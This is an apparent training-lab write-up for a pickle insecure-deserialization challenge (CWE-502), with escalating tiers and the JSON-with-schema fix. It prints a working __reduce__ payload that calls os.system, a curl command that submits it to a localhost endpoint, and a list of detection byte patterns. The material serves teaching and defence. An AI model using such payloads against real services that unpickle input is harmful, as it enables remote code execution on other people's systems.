# Insecure Deserialization

OWASP: https://owasp.org/Top10/2025/A08_2025-Software_and_Data_Integrity_Failures/
CWE: CWE-502

Insecure deserialization occurs when an application deserializes untrusted data using a format that supports arbitrary code execution. Python's `pickle` module is the classic example: `pickle.loads()` can instantiate any class and call any function, making it equivalent to `eval()` on attacker-controlled input.

---

## Unpickle Me This (`deserialize_pickle`)

**Difficulty:** Senior
**CWE:** CWE-502
**Route:** `POST /challenges/deserialize/load` (submit base64-encoded payload)

### Intern Tier

**Vulnerability:** User preferences are stored as base64-encoded pickle data. The `handle_load()` function either detects pickle RCE markers (default safe mode) or actually calls `pickle.loads()` (when `UNSAFE_CHALLENGES=true`).

In the default safe mode, the handler scans the raw pickle bytes for dangerous patterns (`__reduce__`, `os`, `system`, `subprocess`) and flags the attempt as solved without executing it.

**Exploit:**

1. Craft a pickle payload with a `__reduce__` method:

```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

2. Submit the base64-encoded payload:

```bash
curl -X POST http://localhost:8000/challenges/deserialize/load \
  -H "Content-Type: application/json" \
  -d '{"data": "<base64_payload>"}'
```

3. The handler detects `__reduce__` and `os` bytes in the pickle stream and marks the challenge as solved.

**Solve condition:** The handler sets `_solved = True` when it detects RCE-related byte patterns in the pickle data.

**Why it works:** Pickle's `__reduce__` protocol allows objects to specify how they should be reconstructed during deserialization. An attacker provides a class whose `__reduce__` returns a tuple of `(callable, args)`, causing `pickle.loads()` to execute `callable(*args)`. This is arbitrary code execution: the callable can be `os.system`, `subprocess.Popen`, or any other function.

### Junior Tier

**What changed:** Same detection logic as intern. The handler recognizes RCE patterns without executing them.

**Exploit:** Same payload as intern tier.

### Senior Tier

**What changed:** The serialization format is changed from pickle to JSON (base64-encoded). The handler parses the data with `json.loads()`. No schema validation is applied, so arbitrary JSON keys are accepted.

**Bypass:** JSON deserialization does not support arbitrary code execution. The fundamental vulnerability (pickle) is removed. However, the lack of schema validation means an attacker can include unexpected fields (similar to mass assignment).

The challenge cannot be solved at this tier because the `_solved` flag is only set for pickle-based payloads.

### Tech Lead Tier

**Defense:** JSON format with strict schema validation. Only allowed keys (`theme`, `language`, `notifications`) are accepted. Unexpected keys are silently dropped. Non-dict inputs are rejected.

**Why it works:** JSON is a data-only format; it cannot encode executable behavior. The schema allowlist ensures only expected fields are processed. CWE-502 is addressed by replacing a dangerous serialization format (pickle) with a safe one (JSON) and adding input validation.
